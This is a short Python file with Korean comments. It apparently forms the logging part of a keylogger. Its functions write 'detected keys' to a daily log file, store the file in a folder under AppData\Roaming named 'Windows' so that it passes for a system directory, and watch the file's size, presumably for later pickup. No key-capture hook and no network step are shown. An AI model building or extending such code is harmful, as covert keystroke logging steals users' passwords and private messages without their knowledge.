import re
import os
import getpass
from datetime import datetime

username = getpass.getuser()

# 정보를 기록할 파일의   이름 반환

def getLogFileName():
    now = datetime.now() # 2020-01-23 12:34:56.123456
    now = str(now).split(" ")[0]
    filename = now + ".log"
    return filename

# 정보를 기록할 파일의   경로 만들기

def getLogFilePath(fileName):
    dirpath = os.path.join("C:\\Users", username, "Appdata\\Roaming\\Windows")
    if not (os.path.isdir(dirpath)):
        os.makedirs(os.path.join(dirpath))
    filePath = os.path.join(dirpath, fileName)
    return filePath

# 감지한   키를 파일에 기록

def logThisFile(Key):
    Key = str(Key).replace("'", '')
    f = open(getLogFilePath(getLogFileName()), mode="at", encoding="utf-8")
    f.write(Key)
    f.close()

# 파일   크기 변화량을 감지

def detectfileSize():
    filesize = os.path.getsize(getLogFilePath(getLogFileName()))
    return filesize
